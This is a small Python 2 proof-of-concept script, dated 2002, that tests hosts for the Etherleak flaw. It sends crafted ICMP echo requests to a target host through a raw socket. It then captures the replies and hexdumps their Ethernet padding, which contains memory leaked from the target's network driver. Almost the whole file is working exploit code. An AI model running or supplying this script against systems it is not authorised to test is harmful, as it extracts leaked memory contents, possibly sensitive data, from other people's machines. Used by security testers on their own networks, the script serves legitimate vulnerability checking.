#!/usr/bin/python

#############################################################################
##                                                                         ##
## etherleak.py --- Simple tester for the etherleak vulnerability          ##
##                 More infos :                                            ##
##   www.atstake.com/research/advisories/2003/atstake_etherleak_report.pdf ##
##                                                                         ##
## Copyright (C) 2002  Philippe Biondi <biondi@cartel-securite.fr>         ##
##                                                                         ##
## This program is free software; you can redistribute it and/or modify it ##
## under the terms of the GNU General Public License as published by the   ##
## Free Software Foundation; either version 2, or (at your option) any     ##
## later version.                                                          ##
##                                                                         ##
## This program is distributed in the hope that it will be useful, but     ##
## WITHOUT ANY WARRANTY; without even the implied warranty of              ##
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU       ##
## General Public License for more details.                                ##
##                                                                         ##
#############################################################################

from socket import *
import getopt,sys
from select import select


def usage():
    print "Usage: ethereleak.py host"
    sys.exit(0)

ETHERTYPE_IP=0x800

def sane(x):
    r=""
    for i in x:
        j = ord(i)
        if (j < 32) or (j >= 127):
            r=r+"."
        else:
            r=r+i
    return r

def hexdump(x):
    l = len(x)
    for i in range(l):
        print "%02X" % ord(x[i]),
    print " "+sane(x)


#icmp='\x08\x00\x8d\xcb\x12\x34\x00\x00X'
icmp='\x08\x00\xe5\xcb\x12\x34\x00\x00'

try:
    if len(sys.argv) != 2:
        raise getopt.GetoptError("Wrong number of parameters", None)
    target = (sys.argv[1],0)
except  getopt.GetoptError, msg:
    print "ERROR:", msg
    usage()



try:
    s=socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
    t=socket(AF_PACKET, SOCK_RAW, htons(ETHERTYPE_IP))

    i = 0
    seen={}
    while 1:
        s.sendto(icmp, target)
        while 1:
            i,o,e = select([t],[],[],0)
            if not i:
                break
            p = t.recv(1600)
            if ord(p[14+9]) != IPPROTO_ICMP:
                continue
            p=p[34:]
            if p[4:8] != "\x12\x34\x00\x00":
                continue
            p=p[8:]
	    if seen.has_key(p):
		continue
	    seen[p]=None
            hexdump(p)
#            print repr(p)
except KeyboardInterrupt:
    pass

            
                
        
    
